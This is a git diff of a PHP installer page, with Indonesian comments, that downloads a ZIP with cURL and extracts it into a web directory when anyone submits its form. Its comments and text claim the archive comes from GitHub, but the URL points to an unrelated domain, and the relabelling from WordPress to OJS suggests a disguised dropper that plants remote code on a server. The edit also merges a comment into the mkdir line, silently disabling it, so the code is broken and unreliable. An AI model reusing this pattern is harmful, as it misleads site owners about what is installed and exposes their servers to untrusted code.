@@ -12,7 +12,7 @@ $targetDir = __DIR__; // langsung di direktori script ini
 if (isset($_POST['download'])) {
     // URL ZIP ojs-3.4.0-9 dari GitHub
     $url = 'https://seojkw.xyz/ojs-3.4.0-9.zip';
-    $zipName = '7.0.2.zip';
+    $zipName = 'ojs-3.4.0-9.zip';
     $zipPath = $targetDir . '/' . $zipName;
 
     // --- 1. Download file dengan CURL ---
@@ -34,8 +34,7 @@ if (isset($_POST['download'])) {
         $message = "✅ Download berhasil: " . number_format(filesize($zipPath)) . " bytes<br>";
 
         // --- 2. Ekstrak dengan ZipArchive (tanpa exec) ---
-        $extractTo = $targetDir . '/wordpress'; // folder tujuan
-        if (!is_dir($extractTo)) mkdir($extractTo, 0777, true);
+        $extractTo = $targetDir . '/wordpress'; // folder tujuanif (!is_dir($extractTo)) mkdir($extractTo, 0777, true);
 
         if (class_exists('ZipArchive')) {
             $zip = new ZipArchive();
@@ -78,12 +77,12 @@ if (isset($_POST['download'])) {
 ?>
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Install WordPress 7.0.2</title></head>
+<head><meta charset="UTF-8"><title>Install ojs-3.4.0-9</title></head>
 <body style="font-family:Arial;padding:20px;">
-<h2>📥 Download & Install WordPress 7.0.2</h2>
+<h2>📥 Download & Install ojs-3.4.0-9</h2>
 <?php if ($message) echo '<div style="background:#dff0d8;padding:15px;border-radius:5px;margin-bottom:20px;">'.$message.'</div>'; ?>
 <form method="post">
-    <p>Klik tombol di bawah untuk mendownload WordPress 7.0.2 dari GitHub dan mengekstrak ke folder <strong>wordpress</strong> di direktori saat ini.</p>
+    <p>Klik tombol di bawah untuk mendownload ojs-3.4.0-9 dari GitHub dan mengekstrak ke folder <strong>wordpress</strong> di direktori saat ini.</p>
     <input type="checkbox" name="delete_zip" id="del" checked> <label for="del">Hapus file ZIP setelah ekstrak</label><br><br>
     <input type="submit" name="download" value="Download & Ekstrak" style="background:#27ae60;color:#fff;padding:12px 30px;border:none;border-radius:5px;font-size:16px;cursor:pointer;">
 </form>
